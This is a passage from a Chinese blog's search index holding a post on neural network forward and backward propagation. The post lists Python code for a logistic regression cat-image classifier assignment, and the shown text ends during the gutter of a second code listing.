<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>DeepLearning1</title>
      <link href="/2019/03/09/DeepLearning1/"/>
      <url>/2019/03/09/DeepLearning1/</url>
      
        <content type="html"><![CDATA[<h3 id="神经网络正向及反向传播核心算法"><a href="#神经网络正向及反向传播核心算法" class="headerlink" title="神经网络正向及反向传播核心算法"></a>神经网络正向及反向传播核心算法</h3><a id="more"></a><p><img src="/2019/03/09/DeepLearning1/equations.png" alt=""></p><h3 id="Logistics-regression作业"><a href="#Logistics-regression作业" class="headerlink" title="Logistics regression作业"></a>Logistics regression作业</h3><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np</span><br><span class="line"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt</span><br><span class="line"><span class="hljs-keyword">import</span> matplotlib</span><br><span class="line"><span class="hljs-keyword">import</span> h5py</span><br><span class="line"><span class="hljs-keyword">from</span> scipy <span class="hljs-keyword">import</span> ndimage</span><br><span class="line"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image</span><br><span class="line"><span class="hljs-keyword">from</span> lr_utils <span class="hljs-keyword">import</span> load_dataset</span><br><span class="line"><span class="hljs-keyword">import</span> scipy</span><br><span class="line">get_ipython().run_line_magic(<span class="hljs-string">'matplotlib'</span>, <span class="hljs-string">'inline'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">train_set_x_orig, train_set_y, test_set_x_orig, test_set_y, classes = load_dataset()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="hljs-number">7</span></span><br><span class="line">plt.imshow(train_set_x_orig[index])</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"y = "</span> + str(train_set_y[:, index]) + <span class="hljs-string">", it's a '"</span> + classes[np.squeeze(train_set_y[:, index])].decode(<span class="hljs-string">"utf-8"</span>) +  <span class="hljs-string">"' picture."</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">train_set_x_orig.shape</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">train_set_y.shape</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">classes.shape</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">train_set_y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m_train = train_set_x_orig.shape[<span class="hljs-number">0</span>]</span><br><span class="line">m_test = test_set_x_orig.shape[<span class="hljs-number">0</span>]</span><br><span class="line">num_px = train_set_x_orig.shape[<span class="hljs-number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"Number of training examples: m_train = "</span> + str(m_train))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"Number of testing examples: m_test = "</span> + str(m_test))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"Height/Width of each image: num_px = "</span> + str(num_px))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"Each image is of size: ("</span> + str(num_px) + <span class="hljs-string">", "</span> + str(num_px) + <span class="hljs-string">", 3)"</span>)</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"train_set_x shape: "</span> + str(train_set_x_orig.shape))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"train_set_y shape: "</span> + str(train_set_y.shape))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"test_set_x shape: "</span> + str(test_set_x_orig.shape))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"test_set_y shape: "</span> + str(test_set_y.shape))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">### START CODE HERE ### (≈ 2 lines of code)</span></span><br><span class="line">train_set_x_flatten = train_set_x_orig.reshape(train_set_x_orig.shape[<span class="hljs-number">0</span>], <span class="hljs-number">-1</span>).T</span><br><span class="line">test_set_x_flatten = test_set_x_orig.reshape(test_set_x_orig.shape[<span class="hljs-number">0</span>], <span class="hljs-number">-1</span>).T</span><br><span class="line"><span class="hljs-comment">### END CODE HERE ###</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"train_set_x_flatten shape: "</span> + str(train_set_x_flatten.shape))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"train_set_y shape: "</span> + str(train_set_y.shape))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"test_set_x_flatten shape: "</span> + str(test_set_x_flatten.shape))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"test_set_y shape: "</span> + str(test_set_y.shape))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"sanity check after reshaping: "</span> + str(train_set_x_flatten[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>,<span class="hljs-number">0</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">train_set_x = train_set_x_flatten/<span class="hljs-number">255.</span></span><br><span class="line">test_set_x = test_set_x_flatten/<span class="hljs-number">255.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sigmoid</span><span class="hljs-params">(z)</span>:</span></span><br><span class="line">    s = <span class="hljs-number">1</span>/(<span class="hljs-number">1</span>+np.exp(-z))</span><br><span class="line">    <span class="hljs-keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"sigmoid([0, 2]) = "</span> + str(sigmoid(np.array([<span class="hljs-number">0</span>,<span class="hljs-number">2</span>]))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initialize_with_zeros</span><span class="hljs-params">(dim)</span>:</span></span><br><span class="line">    w = np.zeros((dim, <span class="hljs-number">1</span>))</span><br><span class="line">    b = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">assert</span>(w.shape == (dim, <span class="hljs-number">1</span>))</span><br><span class="line">    <span class="hljs-keyword">assert</span>(isinstance(b, float) <span class="hljs-keyword">or</span> isinstance(b, int))</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">return</span> w, b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dim = <span class="hljs-number">2</span></span><br><span class="line">w, b = initialize_with_zeros(dim)</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"w = "</span> + str(w))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"b = "</span> + str(b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">propagate</span><span class="hljs-params">(w, b, X, Y)</span>:</span></span><br><span class="line">    <span class="hljs-comment">#样本数</span></span><br><span class="line">    m = X.shape[<span class="hljs-number">1</span>]</span><br><span class="line">    A = sigmoid(np.dot(w.T, X) + b)</span><br><span class="line">    cost = <span class="hljs-number">-1</span> / m * np.sum(Y * np.log(A) + (<span class="hljs-number">1</span> - Y) * np.log(<span class="hljs-number">1</span> - A))</span><br><span class="line">    </span><br><span class="line">    dw = <span class="hljs-number">1</span> / m * np.dot(X, (A - Y).T)</span><br><span class="line">    db = <span class="hljs-number">1</span> / m * np.sum(A - Y)</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">assert</span>(dw.shape == w.shape)</span><br><span class="line">    <span class="hljs-keyword">assert</span>(db.dtype == float)</span><br><span class="line">    <span class="hljs-comment"># 去除cost数组维度</span></span><br><span class="line">    cost = np.squeeze(cost)</span><br><span class="line">    <span class="hljs-keyword">assert</span>(cost.shape == ())</span><br><span class="line">    </span><br><span class="line">    grads = &#123;<span class="hljs-string">"dw"</span>: dw,</span><br><span class="line">            <span class="hljs-string">"db"</span>: db&#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> grads, cost</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w, b, X, Y = np.array([[<span class="hljs-number">1</span>],[<span class="hljs-number">2</span>]]), <span class="hljs-number">2</span>, np.array([[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">4</span>]]), np.array([[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>]])</span><br><span class="line">grads, cost = propagate(w, b, X, Y)</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"dw = "</span> + str(grads[<span class="hljs-string">"dw"</span>]))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"db = "</span> + str(grads[<span class="hljs-string">"db"</span>]))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"cost = "</span> + str(cost))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">optimize</span><span class="hljs-params">(w, b, X, Y, num_iterations, learning_rate, print_cost = False)</span>:</span></span><br><span class="line">    costs = []</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(num_iterations):</span><br><span class="line">        grads, cost = propagate(w, b, X, Y)</span><br><span class="line">        </span><br><span class="line">        dw = grads[<span class="hljs-string">"dw"</span>]</span><br><span class="line">        db = grads[<span class="hljs-string">"db"</span>]</span><br><span class="line">        </span><br><span class="line">        w = w - learning_rate * dw</span><br><span class="line">        b = b - learning_rate * db</span><br><span class="line">        </span><br><span class="line">        <span class="hljs-keyword">if</span> i % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>:</span><br><span class="line">            costs.append(cost)</span><br><span class="line">        <span class="hljs-keyword">if</span> print_cost <span class="hljs-keyword">and</span> i % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>:</span><br><span class="line">            print(<span class="hljs-string">"cost after iteration %i: %f"</span> %(i, cost))</span><br><span class="line">    params = &#123;<span class="hljs-string">"w"</span>: w,</span><br><span class="line">             <span class="hljs-string">"b"</span>: b&#125;</span><br><span class="line">    grads = &#123;<span class="hljs-string">"dw"</span>: dw,</span><br><span class="line">            <span class="hljs-string">"db"</span>: db&#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> params, grads, costs</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">params, grads, costs = optimize(w, b, X, Y, num_iterations= <span class="hljs-number">100</span>, learning_rate = <span class="hljs-number">0.009</span>, print_cost = <span class="hljs-keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"w = "</span> + str(params[<span class="hljs-string">"w"</span>]))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"b = "</span> + str(params[<span class="hljs-string">"b"</span>]))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"dw = "</span> + str(grads[<span class="hljs-string">"dw"</span>]))</span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"db = "</span> + str(grads[<span class="hljs-string">"db"</span>]))</span><br><span class="line">print(costs)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">predict</span><span class="hljs-params">(w, b, X)</span>:</span></span><br><span class="line">    </span><br><span class="line">    m = X.shape[<span class="hljs-number">1</span>]</span><br><span class="line">    Y_pre = np.zeros((<span class="hljs-number">1</span>, m))</span><br><span class="line">    w = w.reshape(X.shape[<span class="hljs-number">0</span>], <span class="hljs-number">1</span>)</span><br><span class="line">    </span><br><span class="line">    A = sigmoid(np.dot(w.T, X) + b)</span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(A.shape[<span class="hljs-number">1</span>]):</span><br><span class="line">        <span class="hljs-keyword">if</span> A[<span class="hljs-number">0</span>, i] &lt;= <span class="hljs-number">0.5</span>:</span><br><span class="line">            Y_pre[<span class="hljs-number">0</span>, i] = <span class="hljs-number">0</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            Y_pre[<span class="hljs-number">0</span>, i] = <span class="hljs-number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">assert</span>(Y_pre.shape == (<span class="hljs-number">1</span>, m))</span><br><span class="line">    <span class="hljs-keyword">return</span> Y_pre</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">print</span> (<span class="hljs-string">"predictions = "</span> + str(predict(w, b, X)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># GRADED FUNCTION: model</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">model</span><span class="hljs-params">(X_train, Y_train, X_test, Y_test, num_iterations = <span class="hljs-number">2000</span>, learning_rate = <span class="hljs-number">0.5</span>, print_cost = False)</span>:</span></span><br><span class="line">    <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">    Builds the logistic regression model by calling the function you've implemented previously</span></span><br><span class="line"><span class="hljs-string">    </span></span><br><span class="line"><span class="hljs-string">    Arguments:</span></span><br><span class="line"><span class="hljs-string">    X_train -- training set represented by a numpy array of shape (num_px * num_px * 3, m_train)</span></span><br><span class="line"><span class="hljs-string">    Y_train -- training labels represented by a numpy array (vector) of shape (1, m_train)</span></span><br><span class="line"><span class="hljs-string">    X_test -- test set represented by a numpy array of shape (num_px * num_px * 3, m_test)</span></span><br><span class="line"><span class="hljs-string">    Y_test -- test labels represented by a numpy array (vector) of shape (1, m_test)</span></span><br><span class="line"><span class="hljs-string">    num_iterations -- hyperparameter representing the number of iterations to optimize the parameters</span></span><br><span class="line"><span class="hljs-string">    learning_rate -- hyperparameter representing the learning rate used in the update rule of optimize()</span></span><br><span class="line"><span class="hljs-string">    print_cost -- Set to true to print the cost every 100 iterations</span></span><br><span class="line"><span class="hljs-string">    </span></span><br><span class="line"><span class="hljs-string">    Returns:</span></span><br><span class="line"><span class="hljs-string">    d -- dictionary containing information about the model.</span></span><br><span class="line"><span class="hljs-string">    """</span></span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">### START CODE HERE ###</span></span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment"># initialize parameters with zeros (≈ 1 line of code)</span></span><br><span class="line">    w, b = initialize_with_zeros(X_train.shape[<span class="hljs-number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment"># Gradient descent (≈ 1 line of code)</span></span><br><span class="line">    parameters, grads, costs = optimize(w, b, X_train, Y_train, num_iterations, learning_rate, print_cost)</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment"># Retrieve parameters w and b from dictionary "parameters"</span></span><br><span class="line">    w = parameters[<span class="hljs-string">"w"</span>]</span><br><span class="line">    b = parameters[<span class="hljs-string">"b"</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment"># Predict test/train set examples (≈ 2 lines of code)</span></span><br><span class="line">    Y_prediction_test = predict(w, b, X_test)</span><br><span class="line">    Y_prediction_train = predict(w, b, X_train)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">### END CODE HERE ###</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment"># Print train/test Errors</span></span><br><span class="line">    print(<span class="hljs-string">"train accuracy: &#123;&#125; %"</span>.format(<span class="hljs-number">100</span> - np.mean(np.abs(Y_prediction_train - Y_train)) * <span class="hljs-number">100</span>))</span><br><span class="line">    print(<span class="hljs-string">"test accuracy: &#123;&#125; %"</span>.format(<span class="hljs-number">100</span> - np.mean(np.abs(Y_prediction_test - Y_test)) * <span class="hljs-number">100</span>))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    d = &#123;<span class="hljs-string">"costs"</span>: costs,</span><br><span class="line">         <span class="hljs-string">"Y_prediction_test"</span>: Y_prediction_test, </span><br><span class="line">         <span class="hljs-string">"Y_prediction_train"</span> : Y_prediction_train, </span><br><span class="line">         <span class="hljs-string">"w"</span> : w, </span><br><span class="line">         <span class="hljs-string">"b"</span> : b,</span><br><span class="line">         <span class="hljs-string">"learning_rate"</span> : learning_rate,</span><br><span class="line">         <span class="hljs-string">"num_iterations"</span>: num_iterations&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d = model(train_set_x, train_set_y, test_set_x, test_set_y, num_iterations = <span class="hljs-number">1500</span>, learning_rate = <span class="hljs-number">0.005</span>, print_cost = <span class="hljs-keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># Plot learning curve (with costs)</span></span><br><span class="line">costs = np.squeeze(d[<span class="hljs-string">"costs"</span>])</span><br><span class="line">plt.plot(costs)</span><br><span class="line">plt.ylabel(<span class="hljs-string">'cost'</span>)</span><br><span class="line">plt.xlabel(<span class="hljs-string">'iterations (per hundreds)'</span>)</span><br><span class="line">plt.title(<span class="hljs-string">"Learning rate ="</span> + str(d[<span class="hljs-string">"learning_rate"</span>]))</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">## START CODE HERE ## (PUT YOUR IMAGE NAME) </span></span><br><span class="line">my_image = <span class="hljs-string">"psb.jpeg"</span>   <span class="hljs-comment"># change this to the name of your image file </span></span><br><span class="line"><span class="hljs-comment">## END CODE HERE ##</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># We preprocess the image to fit your algorithm.</span></span><br><span class="line">fname = <span class="hljs-string">"images/"</span> + my_image</span><br><span class="line">image = np.array(matplotlib.pyplot.imread(fname))</span><br><span class="line">my_image = scipy.misc.imresize(image, size=(num_px,num_px)).reshape((<span class="hljs-number">1</span>, num_px*num_px*<span class="hljs-number">3</span>)).T</span><br><span class="line">my_predicted_image = predict(d[<span class="hljs-string">"w"</span>], d[<span class="hljs-string">"b"</span>], my_image)</span><br><span class="line"></span><br><span class="line">plt.imshow(image)</span><br><span class="line">print(<span class="hljs-string">"y = "</span> + str(np.squeeze(my_predicted_image)) + <span class="hljs-string">", your algorithm predicts a \""</span> + classes[int(np.squeeze(my_predicted_image)),].decode(<span class="hljs-string">"utf-8"</span>) +  <span class="hljs-string">"\" picture."</span>)</span><br></pre></td></tr></table></figure><h3 id="简单NN算法"><a href="#简单NN算法" class="headerlink" title="简单NN算法"></a>简单NN算法</h3><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span 